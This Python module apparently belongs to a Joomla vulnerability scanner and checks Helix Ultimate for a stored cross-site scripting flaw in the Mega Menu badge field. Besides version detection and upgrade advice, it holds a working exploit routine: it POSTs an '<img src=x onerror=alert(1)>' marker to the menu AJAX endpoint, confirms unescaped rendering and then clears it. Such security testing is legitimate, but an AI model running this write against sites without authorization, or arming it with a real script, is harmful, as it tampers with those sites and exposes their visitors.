from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe
from . import cve_2026_57829 as mega_menu

CVE_ID = "CVE-2026-105602"
NAME = "Helix Ultimate Mega Menu badge stored cross-site scripting"
COMPONENT = "Helix Ultimate (helixultimate)"
AFFECTED_RULE = "Helix Ultimate 1.0.0 through 2.2.10; fixed in 2.2.11"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
PAYLOAD = "<img src=x onerror=alert(1)>"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("2.2.11")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("helixultimate", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Helix Ultimate was not detected through its manifest or template assets.", action="No action is required unless Helix Ultimate is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Helix Ultimate {version}, within the affected range below 2.2.11. Mega Menu badge values are stored in menu parameters and reused in the menu builder and frontend rendering."
        action = "Upgrade Helix Ultimate to 2.2.11 or newer and inspect menu parameters for unexpected badge markup."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Helix Ultimate {version}, which filters the Mega Menu badge value through InputFilter before storage and escapes it at output."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Helix Ultimate was detected, but its version could not be determined."
        action = "Determine the installed Helix Ultimate version and upgrade to 2.2.11 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    menu_item: int | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Write an inert badge marker and look for the unescaped tag on the homepage.

    The write path is the shared Helix Mega Menu dispatcher. The badge value is
    a separate field from the layout values covered by CVE-2026-78077; 2.2.11
    changes ``Helper::sanitizeMegaMenuBadge()`` from HTML-encoding the stored
    value to ``InputFilter::clean(..., 'STRING')`` before the output escaping.
    The probe writes an inert ``<img>`` tag, checks the homepage and clears the
    badge key afterwards.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    page = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(page):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}/", detail=f"The target could not be reached while looking for a menu item ({transport_error_detail(page)}).", action="Retry when the target is reachable.")

    item_id = menu_item or mega_menu._discover_menu_item(page.get("body") or "")
    if not item_id:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{mega_menu.AJAX_PATH}", detail="No published menu item id could be discovered in the homepage markup, so the Mega Menu badge write target is unknown.", action="Re-run with --aggressive-arg menuitem=<published item id> on an authorized staging site.")

    token = f"proofcms105602{secrets.token_hex(4)}"
    marker = f'{token}"{PAYLOAD}'
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    write = client.request(
        f"{base}{mega_menu.AJAX_PATH}",
        method="POST",
        headers=headers,
        data=form_encode({"settings[badge]": marker, "id": str(item_id)}),
        timeout=timeout,
        follow_redirects=False,
    )
    if is_transport_error(write):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{mega_menu.AJAX_PATH}", detail=f"The Mega Menu badge write failed in transit ({transport_error_detail(write)}).", action="Retry when the target is reachable.")

    accepted, refusal = mega_menu._write_accepted(write)
    after = client.get(f"{base}/", timeout=timeout)
    after_body = "" if is_transport_error(after) else (after.get("body") or "")
    raw_tag = token in after_body and PAYLOAD in after_body
    escaped_tag = token in after_body and "&lt;img" in after_body

    restore = client.request(
        f"{base}{mega_menu.AJAX_PATH}",
        method="POST",
        headers=headers,
        data=form_encode({"id": str(item_id)}),
        timeout=timeout,
        follow_redirects=False,
    )
    cleanup_accepted, _ = mega_menu._write_accepted(restore)
    verify = client.get(f"{base}/", timeout=timeout)
    cleanup_verified = not is_transport_error(verify) and token not in (verify.get("body") or "")

    evidence = {
        "menu_item": item_id,
        "marker": marker,
        "write_status": write.get("status"),
        "write_accepted": accepted,
        "refusal": refusal,
        "raw_tag": raw_tag,
        "escaped_tag": escaped_tag,
        "cleanup_accepted": cleanup_accepted,
        "cleanup_verified": cleanup_verified,
    }
    if accepted and raw_tag:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{mega_menu.AJAX_PATH}",
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=cleanup_verified,
            detail=(
                "The Mega Menu badge value was stored and the homepage rendered the inert <img> tag without "
                "escaping it. The marker contained no script and was cleared afterwards."
            ),
            action="Upgrade Helix Ultimate to 2.2.11 or newer and review stored menu parameters.",
        )
    if accepted:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{mega_menu.AJAX_PATH}",
            evidence=evidence,
            cleanup_attempted=True,
            cleanup_verified=cleanup_verified,
            detail="The badge write was accepted, but the homepage escaped the tag or the menu item is not rendered on the homepage.",
            action="Purge the Joomla cache and verify the badge value manually on an authorized staging site.",
        )
    status = "BLOCKED_EXTERNAL" if write.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM" if refusal else "LOW",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{mega_menu.AJAX_PATH}",
        evidence=evidence,
        cleanup_attempted=True,
        cleanup_verified=cleanup_verified,
        detail=f"The Mega Menu badge write was not accepted (HTTP {write.get('status')}{'; ' + refusal if refusal else ''}).",
        action="Upgrade affected Helix Ultimate versions and verify the badge field manually.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    result = mega_menu.run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.cve = CVE_ID
    result.name = NAME
    result.affected_rule = AFFECTED_RULE
    return result


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Helix Ultimate was not detected as potentially affected."
            return passive
        menu_value = aggressive_value(aggressive_args, aggressive_command, "menuitem")
        result = run_aggressive_probe(
            target_url,
            menu_item=int(menu_value) if menu_value and menu_value.isdigit() else None,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (Mega Menu dispatcher reachability) and aggressive (badge marker) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Cross-Site Scripting (XSS)", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["helixultimate"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-105602", "https://www.joomshaper.com/joomla-templates/helixultimate", "https://github.com/JoomShaper/helix-ultimate/releases/tag/v2.2.11"]}
